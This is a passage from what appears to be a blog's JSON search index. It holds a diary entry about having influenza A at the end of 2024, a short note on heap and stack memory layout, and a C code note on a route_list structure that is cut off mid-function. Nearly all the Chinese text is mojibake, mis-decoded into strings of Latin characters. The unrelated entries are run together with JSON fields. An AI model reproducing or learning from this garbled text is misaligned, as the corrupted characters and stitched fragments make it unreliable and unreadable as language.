ä»29å·ä¸Šåˆå¼€å§‹ï¼Œèº«ä½“å°±å¥½åƒåœ¨æ¸©æ°´ç…®é’è›™ï¼Œæœ€é«˜åˆ°è¾¾æƒŠäººçš„å³°å€¼40åº¦ã€‚\nä¸ºäº†æ§åˆ¶ä½“æ¸©ï¼Œæˆ‘å…ˆæ´—ä¸ªçƒ­æ°´æ¾¡ï¼Œåƒäº†å¸ƒæ´›èŠ¬ï¼Œèººåœ¨åºŠä¸Šï¼Œæ‹¿äº†ä¸€å—å†°è¢‹ï¼Œè£¹åœ¨å«ç”Ÿçº¸é‡Œï¼Œæåœ¨è„‘é—¨ä¸Šã€‚èº«ä½“æŒºç›´ï¼Œè£¹ç€ä¸¤å±‚åšè¢«ã€‚\né•¿å¤œæ…¢æ…¢ï¼Œç¡ç¡é†’é†’ã€‚\næˆ‘æ¢¦è§è‡ªå·±å˜æˆäº†ä¸€æ£µæ ‘ï¼Œè„šä¸Šå¥½åƒé•¿å‡ºäº†æ ¹é¡»ï¼Œç¼“æ…¢çš„å¾€åœ°ä¸‹ç”Ÿé•¿ã€‚ç©¿è¿‡æ³¥åœŸï¼Œä¸èš¯èš“æ“¦è‚©è€Œè¿‡ã€‚ç©¿è¿‡å²©çŸ³ï¼Œè¢«çŸ³æ²¹æŸ“é»‘ã€‚ç„¶è€Œåˆ°è¾¾çš„å´æ˜¯ä¸€å—å†°å±±ï¼Œå†°å†·åšç¡¬ã€‚\næ‰‹ä¸Šé•¿å‡ºäº†æ ‘å¹²ï¼Œåƒå¤©ç©ºä¼¸å±•ï¼Œæ‘Šå¼€è‡ªå·±çš„æå¶ï¼Œè¿˜æ²¡ç­‰æˆ‘äº«å—ç‰‡åˆ»æ¸©æš–ï¼Œå¤ªé˜³ä»¿ä½›é£é€Ÿå‘æˆ‘é£æ¥ï¼Œç‚™çƒ­çš„é˜³å…‰è®©æˆ‘ç¬é—´æ¯é»„ï¼Œç°é£çƒŸç­ã€‚\né•¿å¤œæ…¢æ…¢ï¼Œæˆ‘ä¸æ•¢è¾—è½¬åä¾§ã€‚æˆ‘å¤´ä¸Šè¿˜é¡¶ç€ä¸€å—å†°ã€‚\n30å· - å‘çƒ­é—¨è¯Š ç»ˆäºç†¬åˆ°æ—©ä¸Šï¼Œå†æµ‹è¯•ä¸€éä½“æ¸©ï¼Œ38åº¦ã€‚\nç®—äº†ï¼Œè¿˜æ˜¯å»åŒ»é™¢å§ã€‚\nç©¿æˆ´æ•´é½ï¼Œåˆšä¸‹æ¥¼ï¼Œè¿é¢å¹æ¥ä¸€é˜µå†·é£ã€‚æˆ‘æœ‰ç§æ— æ³•å‹æŠ‘çš„ï¼Œæƒ³è¦å’³å—½çš„å†²åŠ¨ï¼Œä½†æ˜¯æˆ‘å¿…é¡»å¿ä½ï¼Œæˆ‘çŸ¥é“è¿™å’³å—½å¿…ç„¶â€œæ„Ÿå¤©åŠ¨åœ°\u0026quot;ã€‚\né£ç»§ç»­å¹ï¼Œæˆ‘å¿ä¸ä½å’³äº†å‡ºæ¥ï¼Œé‚£æ„Ÿè§‰ï¼Œä»¿ä½›æœ‰äººä¼¸æ‰‹æŠŠæˆ‘çš„æ°”ç®¡ä»æˆ‘çš„å˜´å·´é‡Œæ‰¯äº†å‡ºæ¥ã€‚\nåˆ°äº†åŒ»é™¢ï¼Œå‘çƒ­é—¨è¯Šæ˜¯å•ç‹¬ä¸€å±‚çš„å°æˆ¿å­ï¼Œå’Œæ°”æ´¾çš„åå‡ å±‚çš„é—¨è¯Šå¤§æ¥¼ç›¸æ¯”ï¼Œç®€ç›´åƒä¸ªä¿å®‰å®¤ã€‚\nå‘çƒ­é—¨è¯Šè™½å°ï¼Œä½†ä¹Ÿäº”è„ä¿±å…¨ã€‚\nè¿›é—¨å…ˆåšé¼»æ‹­å­ï¼Œé‡ä½“æ¸©ï¼ŒæŒ‚å·ã€‚ å†åšè¡€æ¶²åˆ†æï¼Œç„¶åå°±æ’é˜Ÿç­‰å«å·ã€‚åŒ»ç”Ÿçœ‹äº†æŠ¥å‘Šï¼Œè¯´æˆ‘æ˜¯ç”²æµï¼Œå¼€äº†ä¸¤ç›’è¯ï¼Œä¸€ç›’æŠ—ç—…æ¯’ï¼Œä¸€ç›’ç”¨æ¥é€€çƒ§ã€‚\nä»åŒ»é™¢å‡ºæ¥ï¼Œå·²ç»ä¸­åˆã€‚æˆ‘èµ°è¿›åŒ»é™¢æ—è¾¹çš„æ°¸Xå¤§ç‹ï¼Œå‡†å¤‡éšä¾¿åƒç‚¹ã€‚\næˆ‘æŒ‘äº†ä¸€ä¸ªåº§ä½ï¼Œæ‰«ç ä¸‹å•ï¼Œç‚¹äº†é¦„ç‚–ã€è’¸è›‹ã€è±†æµ†ã€é“¶è€³è²å­ç¾¹ã€‚\nç­‰é¤æœŸé—´ï¼Œ æˆ‘å‘ç°å¯¹é¢æœ‰ä¸ªä¸­å¹´äººå¤§å”ï¼Œç©¿è¿™é»‘è‰²çš„å®½å¤§çš„ç¾½ç»’æœï¼Œèƒ¡å­æ‹‰ç¢´ã€å¤´å‘ç¨€å°‘ï¼Œ ä»–æ—¶ä¸æ—¶çš„å·¡è§†ç€å…¶ä»–çš„äººã€‚\næ²¡è¿‡è¿‡ä¹…ï¼Œæˆ‘ç­‰åˆ°è‡ªå·±çš„é¤ã€‚\né¦„ç‚–ä¸Šæ’’äº†æ·¡é»„çš„é¸¡è›‹ä¸å’Œé»‘è‰²æµ·è‹”ç¢ï¼Œé¸¡è›‹ä¸åƒèµ·æ¥åƒç»³å­ï¼Œæµ·è‹”ç¢å‘³åŒåš¼èœ¡ã€‚æ··åº¦æ±¤éå¸¸æµ‘æµŠï¼Œåƒæ˜¯ç”¨äº†ä¸€å¤©çš„æ¾¡å ‚æ± å­æ°´ã€‚é¦„ç‚–æˆ‘å°±åƒäº†ä¸€ä¸ªï¼Œå°±æ”¾å¼ƒäº†ã€‚\nè’¸è›‹åº”è¯¥æ˜¯é¢„åˆ¶èœï¼Œæ”¾åœ¨é»‘è‰²å¡‘æ–™å°æ¯ä¸­ï¼Œåº”è¯¥æ˜¯å¾®æ³¢ç‚‰åŠ çƒ­çš„ã€‚æˆ‘åƒäº†ä¸€å£ï¼Œå‘³é“å¥‡æ€ªã€‚\nè±†æµ†æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ¯•ç«Ÿä¹Ÿå‘³é“ä¹Ÿæ²¡æœ‰ä¸‹é™ç©ºé—´äº†ã€‚\né“¶è€³è²å­ç¾¹è¿˜ä¸é”™ï¼Œæˆ‘éƒ½ä¸ªå–å®Œäº†ã€‚\nåƒé¥±å–è¶³ï¼Œé¡ºä¾¿æˆ‘æŠŠåŒ»ç”Ÿç»™æˆ‘å¼€çš„è¯ä¹Ÿåƒäº†ï¼Œæˆ‘èµ·èº«ç¦»å¼€ï¼Œåˆšèµ°åˆ°é¤æ¡Œä¸åˆ°2ç±³ï¼Œ å°±ç¥è§é‚£ä¸ªå¤§å”åŒ†åŒ†èµ°å‘æˆ‘çš„é¤æ¡Œã€‚\næ€¥è¯Šå®¤ æˆ‘åƒå®Œé¥­ï¼Œå›åˆ°å®¶ï¼Œæ¯éš”ä¸€ä¸ªå°æ—¶æµ‹ä¸€æ¬¡ä½“æ¸©ï¼Œä½“æ¸©å¾ˆç¨³å®šï¼Œç¨³å®šåœ¨38åº¦å·¦å³ã€‚\nä¸€ç›´åˆ°æ™šä¸Šï¼Œæˆ‘çš„ä½“æ¸©è¿˜æ˜¯æ²¡æ€ä¹ˆä¸‹é™ã€‚\nè€å©†ç»™æˆ‘æ‰“ç”µè¯ï¼Œè¯´è®©æˆ‘èµ¶ç´§å»æ€¥è¯Šï¼Œå»è¾“æ¶²ï¼Œå…‰åƒè¯æ•ˆæœä¸å¥½ï¼Œé«˜çƒ§ä¸é€€ä¼šè¦äººå‘½çš„ã€‚ ä½†æ˜¯æˆ‘è§‰å¾—æ²¡å¿…è¦ï¼Œå› ä¸ºå°½ç„¶å‘çƒ­é—¨è¯Šçš„åŒ»ç”Ÿéƒ½æ²¡æœ‰è®©æˆ‘è¾“æ¶²ï¼Œè¯´æ˜æˆ‘ä¸éœ€è¦è¾“æ¶²ï¼Œæˆ–è€…è¯´è¾“æ¶²ä¹Ÿæ²¡æœ‰å¤šå¤§ä½œç”¨ã€‚\nè€å©†è¯´ï¼š\u0026ldquo;ä½ æƒ³è®©æˆ‘ä¸­å¹´ä¸§å¤«å—ï¼Ÿ\u0026rdquo;\næˆ‘æ— è¯å¯è¯´ï¼Œåªèƒ½é»˜é»˜ç©¿ä¸Šè¡£æœï¼Œå¸¦ä¸Šå£ç½©ï¼Œå»äº†æ—©ä¸Šé‚£å®¶åŒ»é™¢çš„æ€¥è¯Šã€‚\næ™šä¸Š9ç‚¹æ€¥è¯Šå®¤äººæ¥äººå¾€ï¼Œç»œç»ä¸ç»ï¼Œä»¿ä½›æ˜¯ç™½å¤©çš„é—¨è¯Šã€‚ æˆ‘æŒ‚ä¸Šå·ï¼Œæ¥ç€åˆç­‰äº†å°†è¿‘1ä¸ªå°æ—¶ï¼Œç»ˆäºç­‰åˆ°æˆ‘äº†ã€‚\nç»™æˆ‘çœ‹ç—…çš„æ˜¯ä½å¥³åŒ»ç”Ÿã€‚\nâ€åŒ»ç”Ÿï¼Œæˆ‘åœ¨ä½ ä»¬åŒ»é™¢å‘ç”Ÿé—¨è¯Šæ—©ä¸Šå°±çœ‹è¿‡äº†ï¼Œè¯Šæ–­æ˜¯ç”²æµï¼Œè¯ä¹Ÿåƒäº†ï¼Œåˆ°ç°åœ¨è¿˜æ˜¯38åº¦ï¼Œè¿˜æ˜¯ç»™æˆ‘è¾“æ¶²å§ã€‚â€œï¼Œæˆ‘è¯´\nâ€ç”²æµä¸æ˜¯ä¸€å¤©ä¸¤å¤©èƒ½å¥½çš„ï¼Œè‡³å°‘è¦å‘çƒ­ä¸‰å¤©ï¼Œè€Œä¸”è¾“æ¶²æ•ˆæœä¹Ÿä¸å¤§â€œï¼ŒåŒ»ç”Ÿè¯´\nâ€œé‚£æˆ‘ä¹Ÿçƒ§äº†ä¸¤å¤©äº†ï¼Œå†çƒ§ä¸‹å»äººè¦çƒ§æ²¡äº†ã€‚ä½ ç»™æˆ‘å¼€ä¸ªè¾“æ¶²çš„å§â€\nâ€œå¥½çš„å§ï¼Œé‚£æˆ‘å°±ç»™ä½ å¼€ä¸€æ¬¡è¾“æ¶²ï¼Œä½ çœ‹çœ‹æ•ˆæœâ€\nä¸€é¡¿æ‹‰æ‰¯ï¼Œæˆ‘ç»ˆäºèƒ½è¾“æ¶²äº†ã€‚å…¶å®è¾“çš„ä¹Ÿä¸æ˜¯ä»€ä¹ˆç‰¹æ®Šçš„ä¸œè¥¿ï¼Œå°±æ˜¯ä¸€å¸¦å·¦æ°§å’Œä¸€è¢‹ç»´Cã€‚\nè¾“å®Œæ¶²ï¼Œå·²ç»æ™šä¸Š11ç‚¹50ï¼Œå«äº†è½¦ï¼Œå›åˆ°å®¶é‡Œã€‚æ„Ÿè§‰å˜´å·´å¥½è‹¦ï¼Œè¿˜å¥½å®¶é‡Œæœ‰ç”œçš„å†°ç³–å¿ƒè‹¹æœã€‚\næˆ‘å•ƒå®Œç¬¬ä¸€ä¸ªè‹¹æœï¼Œæ¯ä¸€å£éƒ½æ˜¯è‹¦å‘³ã€‚æ¥ç€æˆ‘å†å•ƒä¸€ä¸ªè‹¹æœï¼Œæ¯ä¸€å£éƒ½è¿˜æ˜¯è‹¦å‘³ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºå‘çƒ§ï¼Œæˆ‘ç®€ç›´ç«‹å³æƒ³å»åƒç‚¹ç«é”…åº•æ–™æ¼±æ¼±å£ã€‚\nå½’æ¢¦ ç¡è§‰å‰ï¼Œæˆ‘åˆé‡äº†ä¸€æ¬¡ä½“æ¸©ã€‚ä½“æ¸©æ¢å¤åˆ°37åº¦ï¼Œçœ‹èµ·æ¥æ­£å¸¸æ­£å¸¸äº†ã€‚\næˆ‘ä¸çŸ¥é“è¿™æ˜¯åƒè¯èµ·çš„æ•ˆæœè¿˜æ˜¯è¾“æ¶²çš„æ•ˆæœã€‚\nä½†æ˜¯ä¸¤ç›’è¯çš„ä»·æ ¼æ˜¯270ï¼Œå…¶ä¸­ä¸€ç›’è¥¿è¯50ï¼Œå¦ä¸€ç›’é‡è¦220ã€‚\nè¾“æ¶²å‘¢ï¼Œä¸€è¢‹å·¦æ°§+ç»´Cï¼Œæ€»å…±ä¹Ÿä¸è¿‡æ‰30ã€‚\nè®©æˆ‘æƒ³èµ·äº†ç”µå½±ã€Šå¤§è…•ã€‹çš„åè¨€\n31å· è¿™æ˜¯24å¹´çš„æœ€åä¸€å¤©ï¼Œç¾ä¸½çš„çƒŸèŠ±åœ¨å¤©ç©ºä¸­ç»½æ”¾ç’€ç’¨çš„å…‰èŠ’ã€‚\næœ‰äº›äººè§‰å¾—çƒŸèŠ±ç¾ä¸½ï¼Œæœ‰äº›äººåªè§‰å¾—åµã€‚\n","permalink":"https://wdd.js.org/posts/2024/the-edn-day/","summary":"28å· - æŠ—ä½“ 28å·æ™šä¸Šï¼Œæˆ‘è§‰å¾—å—“å­æœ‰ç‚¹åˆºç—›ã€‚å› ä¸ºå‰ä¸¤å‘¨å‘è¿‡ä¸€æ¬¡çƒ§ï¼Œæˆ‘è§‰å¾—è¿™æ¬¡å—“å­ç—›åº”è¯¥ä¸ä¼šæ˜¯å‘çƒ§çš„å‰å¥äº†ï¼Œæ¯•ç«Ÿèº«ä½“æ˜¯æœ‰æŠ—ä½“çš„ã€‚\næˆ‘é«˜ä¼°äº†ä¹‹å‰äº§ç”Ÿçš„æŠ—ä½“ã€‚\n29å· - æ¢¦ ä»29å·ä¸Šåˆå¼€å§‹ï¼Œèº«ä½“å°±å¥½åƒåœ¨æ¸©æ°´ç…®é’è›™ï¼Œæœ€é«˜åˆ°è¾¾æƒŠäººçš„å³°å€¼40åº¦ã€‚\nä¸ºäº†æ§åˆ¶ä½“æ¸©ï¼Œæˆ‘å…ˆæ´—ä¸ªçƒ­æ°´æ¾¡ï¼Œåƒäº†å¸ƒæ´›èŠ¬ï¼Œèººåœ¨åºŠä¸Šï¼Œæ‹¿äº†ä¸€å—å†°è¢‹ï¼Œè£¹åœ¨å«ç”Ÿçº¸é‡Œï¼Œæåœ¨è„‘é—¨ä¸Šã€‚èº«ä½“æŒºç›´ï¼Œè£¹ç€ä¸¤å±‚åšè¢«ã€‚\né•¿å¤œæ…¢æ…¢ï¼Œç¡ç¡é†’é†’ã€‚\næˆ‘æ¢¦è§è‡ªå·±å˜æˆäº†ä¸€æ£µæ ‘ï¼Œè„šä¸Šå¥½åƒé•¿å‡ºäº†æ ¹é¡»ï¼Œç¼“æ…¢çš„å¾€åœ°ä¸‹ç”Ÿé•¿ã€‚ç©¿è¿‡æ³¥åœŸï¼Œä¸èš¯èš“æ“¦è‚©è€Œè¿‡ã€‚ç©¿è¿‡å²©çŸ³ï¼Œè¢«çŸ³æ²¹æŸ“é»‘ã€‚ç„¶è€Œåˆ°è¾¾çš„å´æ˜¯ä¸€å—å†°å±±ï¼Œå†°å†·åšç¡¬ã€‚\næ‰‹ä¸Šé•¿å‡ºäº†æ ‘å¹²ï¼Œåƒå¤©ç©ºä¼¸å±•ï¼Œæ‘Šå¼€è‡ªå·±çš„æå¶ï¼Œè¿˜æ²¡ç­‰æˆ‘äº«å—ç‰‡åˆ»æ¸©æš–ï¼Œå¤ªé˜³ä»¿ä½›é£é€Ÿå‘æˆ‘é£æ¥ï¼Œç‚™çƒ­çš„é˜³å…‰è®©æˆ‘ç¬é—´æ¯é»„ï¼Œç°é£çƒŸç­ã€‚\né•¿å¤œæ…¢æ…¢ï¼Œæˆ‘ä¸æ•¢è¾—è½¬åä¾§ã€‚æˆ‘å¤´ä¸Šè¿˜é¡¶ç€ä¸€å—å†°ã€‚\n30å· - å‘çƒ­é—¨è¯Š ç»ˆäºç†¬åˆ°æ—©ä¸Šï¼Œå†æµ‹è¯•ä¸€éä½“æ¸©ï¼Œ38åº¦ã€‚\nç®—äº†ï¼Œè¿˜æ˜¯å»åŒ»é™¢å§ã€‚\nç©¿æˆ´æ•´é½ï¼Œåˆšä¸‹æ¥¼ï¼Œè¿é¢å¹æ¥ä¸€é˜µå†·é£ã€‚æˆ‘æœ‰ç§æ— æ³•å‹æŠ‘çš„ï¼Œæƒ³è¦å’³å—½çš„å†²åŠ¨ï¼Œä½†æ˜¯æˆ‘å¿…é¡»å¿ä½ï¼Œæˆ‘çŸ¥é“è¿™å’³å—½å¿…ç„¶â€œæ„Ÿå¤©åŠ¨åœ°\u0026quot;ã€‚\né£ç»§ç»­å¹ï¼Œæˆ‘å¿ä¸ä½å’³äº†å‡ºæ¥ï¼Œé‚£æ„Ÿè§‰ï¼Œä»¿ä½›æœ‰äººä¼¸æ‰‹æŠŠæˆ‘çš„æ°”ç®¡ä»æˆ‘çš„å˜´å·´é‡Œæ‰¯äº†å‡ºæ¥ã€‚\nåˆ°äº†åŒ»é™¢ï¼Œå‘çƒ­é—¨è¯Šæ˜¯å•ç‹¬ä¸€å±‚çš„å°æˆ¿å­ï¼Œå’Œæ°”æ´¾çš„åå‡ å±‚çš„é—¨è¯Šå¤§æ¥¼ç›¸æ¯”ï¼Œç®€ç›´åƒä¸ªä¿å®‰å®¤ã€‚\nå‘çƒ­é—¨è¯Šè™½å°ï¼Œä½†ä¹Ÿäº”è„ä¿±å…¨ã€‚\nè¿›é—¨å…ˆåšé¼»æ‹­å­ï¼Œé‡ä½“æ¸©ï¼ŒæŒ‚å·ã€‚ å†åšè¡€æ¶²åˆ†æï¼Œç„¶åå°±æ’é˜Ÿç­‰å«å·ã€‚åŒ»ç”Ÿçœ‹äº†æŠ¥å‘Šï¼Œè¯´æˆ‘æ˜¯ç”²æµï¼Œå¼€äº†ä¸¤ç›’è¯ï¼Œä¸€ç›’æŠ—ç—…æ¯’ï¼Œä¸€ç›’ç”¨æ¥é€€çƒ§ã€‚\nä»åŒ»é™¢å‡ºæ¥ï¼Œå·²ç»ä¸­åˆã€‚æˆ‘èµ°è¿›åŒ»é™¢æ—è¾¹çš„æ°¸Xå¤§ç‹ï¼Œå‡†å¤‡éšä¾¿åƒç‚¹ã€‚\næˆ‘æŒ‘äº†ä¸€ä¸ªåº§ä½ï¼Œæ‰«ç ä¸‹å•ï¼Œç‚¹äº†é¦„ç‚–ã€è’¸è›‹ã€è±†æµ†ã€é“¶è€³è²å­ç¾¹ã€‚\nç­‰é¤æœŸé—´ï¼Œ æˆ‘å‘ç°å¯¹é¢æœ‰ä¸ªä¸­å¹´äººå¤§å”ï¼Œç©¿è¿™é»‘è‰²çš„å®½å¤§çš„ç¾½ç»’æœï¼Œèƒ¡å­æ‹‰ç¢´ã€å¤´å‘ç¨€å°‘ï¼Œ ä»–æ—¶ä¸æ—¶çš„å·¡è§†ç€å…¶ä»–çš„äººã€‚\næ²¡è¿‡è¿‡ä¹…ï¼Œæˆ‘ç­‰åˆ°è‡ªå·±çš„é¤ã€‚\né¦„ç‚–ä¸Šæ’’äº†æ·¡é»„çš„é¸¡è›‹ä¸å’Œé»‘è‰²æµ·è‹”ç¢ï¼Œé¸¡è›‹ä¸åƒèµ·æ¥åƒç»³å­ï¼Œæµ·è‹”ç¢å‘³åŒåš¼èœ¡ã€‚æ··åº¦æ±¤éå¸¸æµ‘æµŠï¼Œåƒæ˜¯ç”¨äº†ä¸€å¤©çš„æ¾¡å ‚æ± å­æ°´ã€‚é¦„ç‚–æˆ‘å°±åƒäº†ä¸€ä¸ªï¼Œå°±æ”¾å¼ƒäº†ã€‚\nè’¸è›‹åº”è¯¥æ˜¯é¢„åˆ¶èœï¼Œæ”¾åœ¨é»‘è‰²å¡‘æ–™å°æ¯ä¸­ï¼Œåº”è¯¥æ˜¯å¾®æ³¢ç‚‰åŠ çƒ­çš„ã€‚æˆ‘åƒäº†ä¸€å£ï¼Œå‘³é“å¥‡æ€ªã€‚\nè±†æµ†æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ¯•ç«Ÿä¹Ÿå‘³é“ä¹Ÿæ²¡æœ‰ä¸‹é™ç©ºé—´äº†ã€‚\né“¶è€³è²å­ç¾¹è¿˜ä¸é”™ï¼Œæˆ‘éƒ½ä¸ªå–å®Œäº†ã€‚\nåƒé¥±å–è¶³ï¼Œé¡ºä¾¿æˆ‘æŠŠåŒ»ç”Ÿç»™æˆ‘å¼€çš„è¯ä¹Ÿåƒäº†ï¼Œæˆ‘èµ·èº«ç¦»å¼€ï¼Œåˆšèµ°åˆ°é¤æ¡Œä¸åˆ°2ç±³ï¼Œ å°±ç¥è§é‚£ä¸ªå¤§å”åŒ†åŒ†èµ°å‘æˆ‘çš„é¤æ¡Œã€‚\næ€¥è¯Šå®¤ æˆ‘åƒå®Œé¥­ï¼Œå›åˆ°å®¶ï¼Œæ¯éš”ä¸€ä¸ªå°æ—¶æµ‹ä¸€æ¬¡ä½“æ¸©ï¼Œä½“æ¸©å¾ˆç¨³å®šï¼Œç¨³å®šåœ¨38åº¦å·¦å³ã€‚\nä¸€ç›´åˆ°æ™šä¸Šï¼Œæˆ‘çš„ä½“æ¸©è¿˜æ˜¯æ²¡æ€ä¹ˆä¸‹é™ã€‚\nè€å©†ç»™æˆ‘æ‰“ç”µè¯ï¼Œè¯´è®©æˆ‘èµ¶ç´§å»æ€¥è¯Šï¼Œå»è¾“æ¶²ï¼Œå…‰åƒè¯æ•ˆæœä¸å¥½ï¼Œé«˜çƒ§ä¸é€€ä¼šè¦äººå‘½çš„ã€‚ ä½†æ˜¯æˆ‘è§‰å¾—æ²¡å¿…è¦ï¼Œå› ä¸ºå°½ç„¶å‘çƒ­é—¨è¯Šçš„åŒ»ç”Ÿéƒ½æ²¡æœ‰è®©æˆ‘è¾“æ¶²ï¼Œè¯´æ˜æˆ‘ä¸éœ€è¦è¾“æ¶²ï¼Œæˆ–è€…è¯´è¾“æ¶²ä¹Ÿæ²¡æœ‰å¤šå¤§ä½œç”¨ã€‚\nè€å©†è¯´ï¼š\u0026ldquo;ä½ æƒ³è®©æˆ‘ä¸­å¹´ä¸§å¤«å—ï¼Ÿ\u0026rdquo;\næˆ‘æ— è¯å¯è¯´ï¼Œåªèƒ½é»˜é»˜ç©¿ä¸Šè¡£æœï¼Œå¸¦ä¸Šå£ç½©ï¼Œå»äº†æ—©ä¸Šé‚£å®¶åŒ»é™¢çš„æ€¥è¯Šã€‚\næ™šä¸Š9ç‚¹æ€¥è¯Šå®¤äººæ¥äººå¾€ï¼Œç»œç»ä¸ç»ï¼Œä»¿ä½›æ˜¯ç™½å¤©çš„é—¨è¯Šã€‚ æˆ‘æŒ‚ä¸Šå·ï¼Œæ¥ç€åˆç­‰äº†å°†è¿‘1ä¸ªå°æ—¶ï¼Œç»ˆäºç­‰åˆ°æˆ‘äº†ã€‚\nç»™æˆ‘çœ‹ç—…çš„æ˜¯ä½å¥³åŒ»ç”Ÿã€‚\nâ€åŒ»ç”Ÿï¼Œæˆ‘åœ¨ä½ ä»¬åŒ»é™¢å‘ç”Ÿé—¨è¯Šæ—©ä¸Šå°±çœ‹è¿‡äº†ï¼Œè¯Šæ–­æ˜¯ç”²æµï¼Œè¯ä¹Ÿåƒäº†ï¼Œåˆ°ç°åœ¨è¿˜æ˜¯38åº¦ï¼Œè¿˜æ˜¯ç»™æˆ‘è¾“æ¶²å§ã€‚â€œï¼Œæˆ‘è¯´\nâ€ç”²æµä¸æ˜¯ä¸€å¤©ä¸¤å¤©èƒ½å¥½çš„ï¼Œè‡³å°‘è¦å‘çƒ­ä¸‰å¤©ï¼Œè€Œä¸”è¾“æ¶²æ•ˆæœä¹Ÿä¸å¤§â€œï¼ŒåŒ»ç”Ÿè¯´\nâ€œé‚£æˆ‘ä¹Ÿçƒ§äº†ä¸¤å¤©äº†ï¼Œå†çƒ§ä¸‹å»äººè¦çƒ§æ²¡äº†ã€‚ä½ ç»™æˆ‘å¼€ä¸ªè¾“æ¶²çš„å§â€\nâ€œå¥½çš„å§ï¼Œé‚£æˆ‘å°±ç»™ä½ å¼€ä¸€æ¬¡è¾“æ¶²ï¼Œä½ çœ‹çœ‹æ•ˆæœâ€\nä¸€é¡¿æ‹‰æ‰¯ï¼Œæˆ‘ç»ˆäºèƒ½è¾“æ¶²äº†ã€‚å…¶å®è¾“çš„ä¹Ÿä¸æ˜¯ä»€ä¹ˆç‰¹æ®Šçš„ä¸œè¥¿ï¼Œå°±æ˜¯ä¸€å¸¦å·¦æ°§å’Œä¸€è¢‹ç»´Cã€‚\nè¾“å®Œæ¶²ï¼Œå·²ç»æ™šä¸Š11ç‚¹50ï¼Œå«äº†è½¦ï¼Œå›åˆ°å®¶é‡Œã€‚æ„Ÿè§‰å˜´å·´å¥½è‹¦ï¼Œè¿˜å¥½å®¶é‡Œæœ‰ç”œçš„å†°ç³–å¿ƒè‹¹æœã€‚\næˆ‘å•ƒå®Œç¬¬ä¸€ä¸ªè‹¹æœï¼Œæ¯ä¸€å£éƒ½æ˜¯è‹¦å‘³ã€‚æ¥ç€æˆ‘å†å•ƒä¸€ä¸ªè‹¹æœï¼Œæ¯ä¸€å£éƒ½è¿˜æ˜¯è‹¦å‘³ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºå‘çƒ§ï¼Œæˆ‘ç®€ç›´ç«‹å³æƒ³å»åƒç‚¹ç«é”…åº•æ–™æ¼±æ¼±å£ã€‚\nå½’æ¢¦ ç¡è§‰å‰ï¼Œæˆ‘åˆé‡äº†ä¸€æ¬¡ä½“æ¸©ã€‚ä½“æ¸©æ¢å¤åˆ°37åº¦ï¼Œçœ‹èµ·æ¥æ­£å¸¸æ­£å¸¸äº†ã€‚\næˆ‘ä¸çŸ¥é“è¿™æ˜¯åƒè¯èµ·çš„æ•ˆæœè¿˜æ˜¯è¾“æ¶²çš„æ•ˆæœã€‚\nä½†æ˜¯ä¸¤ç›’è¯çš„ä»·æ ¼æ˜¯270ï¼Œå…¶ä¸­ä¸€ç›’è¥¿è¯50ï¼Œå¦ä¸€ç›’é‡è¦220ã€‚\nè¾“æ¶²å‘¢ï¼Œä¸€è¢‹å·¦æ°§+ç»´Cï¼Œæ€»å…±ä¹Ÿä¸è¿‡æ‰30ã€‚\nè®©æˆ‘æƒ³èµ·äº†ç”µå½±ã€Šå¤§è…•ã€‹çš„åè¨€\n31å· è¿™æ˜¯24å¹´çš„æœ€åä¸€å¤©ï¼Œç¾ä¸½çš„çƒŸèŠ±åœ¨å¤©ç©ºä¸­ç»½æ”¾ç’€ç’¨çš„å…‰èŠ’ã€‚\næœ‰äº›äººè§‰å¾—çƒŸèŠ±ç¾ä¸½ï¼Œæœ‰äº›äººåªè§‰å¾—åµã€‚","title":"2024å¹´çš„æœ€åä¸‰å¤© - ç”²æµæ¥è¢­"},{"content":"å†…å­˜å¸ƒå±€ å †å’Œæ ˆä¹‹å‰æœ‰å¤§ç‰‡çš„ç©ºç™½è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œç”¨å¤šå°‘æ˜ å°„å¤šå°‘ å †å’Œæ ˆæ˜¯åƒç›¸åçš„æ–¹å‘å¢é•¿ ","permalink":"https://wdd.js.org/books/006-cpu%E7%9C%BC%E9%87%8C%E7%9A%84c-c-plus/","summary":"å†…å­˜å¸ƒå±€ å †å’Œæ ˆä¹‹å‰æœ‰å¤§ç‰‡çš„ç©ºç™½è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œç”¨å¤šå°‘æ˜ å°„å¤šå°‘ å †å’Œæ ˆæ˜¯åƒç›¸åçš„æ–¹å‘å¢é•¿ ","title":"CPUçœ¼é‡Œçš„C/C++"},{"content":"[[TOC]]\nroute_list route.hå®šä¹‰äº†å‡ ä¸ªå‡½æ•°åˆ†åˆ«ç”¨æ¥è·å–ã€æŸ¥æ‰¾ã€æ–°å¢route\n// src/core/route.h int route_get(struct route_list *rt, char *name); int route_lookup(struct route_list *rt, char *name); void push(struct action *a, struct action **head); struct route_list { struct action **rlist; int idx;\t/* first empty entry */ int entries;\t/* total number of entries */ struct str_hash_table names; /* name to route index mappings */ }; rlist æˆ‘ä»¬å¯¹route_listæ•°æ®æ¨¡å‹è¿›è¡Œç®€åŒ–:\nrlistæ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„ä¸€ç»´æ•°ç»„ï¼Œé€šè¿‡ç´¢å¼•æ¥è®¿é—®å¯¹åº”çš„å€¼ã€‚å¦‚æœæ•°ç»„çš„ç©ºé—´ä¸è¶³ï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªä¸¤å€å¤§çš„ç©ºæ•°æ®ï¼Œç„¶åå…ˆæŠŠåŸå§‹æ•°æ®å¤åˆ¶è¿‡å»ã€‚è¿™ç§å¤åˆ¶æ–¹å¼ä¿æŒçš„åŸå§‹æ•°æ®çš„ç´¢å¼•ä½ç½®ã€‚æœ‰ç‚¹åƒgolangçš„åˆ‡ç‰‡æ‰©å®¹æœºåˆ¶ã€‚\nè¿™é‡Œæœ€ä¸ºé‡è¦çš„å°±æ˜¯ä¿æŒæ•°ç»„å…ƒç´ çš„ç´¢å¼•ä½ç½®åœ¨æ‰©å®¹åä¸å˜ã€‚\nstatic inline int route_new_list(struct route_list *rt) { int ret; struct action **tmp; ret = -1; if(rt-\u0026gt;idx \u0026gt;= rt-\u0026gt;entries) { // ä¸¤å€æ‰©å®¹ tmp = pkg_realloc(rt-\u0026gt;rlist, 2 * rt-\u0026gt;entries * sizeof(struct action *)); if(tmp == 0) { LM_CRIT(\u0026#34;out of memory\\n\u0026#34;); goto end; } /* init the newly 